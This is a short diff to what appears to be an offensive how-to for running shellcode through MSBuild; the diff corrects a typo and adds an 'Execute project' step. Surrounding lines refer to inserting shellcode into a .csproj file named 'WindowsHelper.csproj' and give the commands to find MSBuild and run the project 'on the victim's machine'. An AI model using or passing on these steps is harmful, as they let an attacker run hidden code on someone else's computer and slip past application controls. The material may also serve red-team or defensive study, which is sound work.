@@ -139,11 +139,13 @@ Insert shellcode into line 46 and output as .csproj file:
 
 On the victim's machine:
 
-Identfy MSBuild
+Identify MSBuild version
 
 ```
 dir /b /s C:\msbuild.exe
 ```
+
+Execute project
 
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe WindowsHelper.csproj
